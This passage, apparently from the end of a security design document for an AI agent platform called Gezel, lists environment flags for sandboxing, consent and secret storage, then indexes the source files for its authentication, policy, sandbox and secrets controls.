| `GEZEL_SYSTEM_SCOPE` | unset *(per-user)* / 1 *(packaged machine service)* | Makes scoped runtime discovery metadata readable across local accounts; never exposes the root token. |
| `GEZEL_AUTOAPPROVE_APPS` | empty *(default)* / csv | Auto-approve named `/v1` app grants **without consent**. CI only — never set in shipped builds. |
| `GEZEL_SECRETS_BACKEND` | (auto) / file | Force the plaintext-keyed file secret store (used by evals; see secrets-security.md). |
| `GEZEL_WEB` | unset *(default)* / 1 | Mint a dedicated browser web-UI token (`--web`). |
| `GEZEL_MCP_EXCLUDE` | (per-provider) | Strip named tools from the MCP surface at registration time. |
| `GEZEL_MXC_EXEC` | unset *(use the verified install)* / path | The Windows sandbox launcher `wxc-exec.exe`. The packaged supervisor sets it to its verified copy. |
| `GEZEL_MXC` | on *(default)* / off | Turn the Windows script container off for this process, whatever Settings says. |
| `GEZEL_MXC_MAX_CONCURRENT` | max(8, cores) | Cap on containers running at once; further runs queue. |
| `GEZEL_MXC_SKIP` | unset / 1 | Build time: leave the launcher out of the Windows installer. |
| `GEZEL_SCRIPT_DENY_NET_BOUNDARY` | set by the service | Tells a gezel-mcp child the container is active, so it offers `run_nodejs_script` / `derive_file` on Windows. |

---

## 16. Key-file index

**Daemon / auth**
- `packages/service/src/http/server.ts` — middleware chain + route mounts.
- `packages/service/src/http/auth.ts` — `bearerAuth`, `requireScope`, `c.var.auth` shape.
- `packages/service/src/http/token-store.ts` — token records, scopes, `issueSession`/`revokeSession`.
- `packages/service/src/http/scope-guard.ts` — the three scope guards + `isTeamRoute`/`targetGezelId`.
- `packages/service/src/http/host-guard.ts`, `cors.ts`, `cert.ts` — network edge.

**Policy / capabilities**
- `packages/core/src/security/policy.ts` — levels, the five booleans, `resolveSecurityPolicy`.
- `packages/service/src/chat/role-tool-filter.ts` — surface filter, `roleHasTeamScope`.
- `packages/service/src/providers/mcp-bridge-pool.ts` — `isCallableByModel` call-time guard.

**Sandbox / scripts**
- `packages/service/src/sandbox/runner.ts`, `macos.ts` — OS sandbox, net-block, resource caps.
- `packages/service/src/sandbox/windows-mxc.ts`, `stdio-rpc.ts` — Windows container policy, probe, resolve hook, stdio RPC.
- `packages/core/src/native/mxc-pin.ts` — the pinned, Microsoft-signed launcher.
- `packages/service/src/scripts/runner.ts`, `dispatcher.ts` — capability gating, credential resolution.

**fs / secrets / ssrf**
- `packages/inference/src/fs/safe-paths.ts`, `fs/store.ts`, `fs/atomic.ts`.
- `packages/service/src/secrets/file-store.ts`, `secrets/registry.ts`.
- `packages/service/src/utils/ssrf.ts`.

**Electron**
- `packages/app/src/main.ts`, `preload.cjs`, `supervisor/extract-bundle.ts`.

**Consent / approvals**
- `packages/service/src/grants/manager.ts` — Connected-App consent.
- `packages/service/src/workspace/command-approvals.ts` — content-hashed command approvals.

---

*Maintenance: when you add or change a security control, update the relevant section, the
status tag, §14 (limitations), and §15 (flags). When you add a model-reachable tool, walk
§13 invariant #7.*
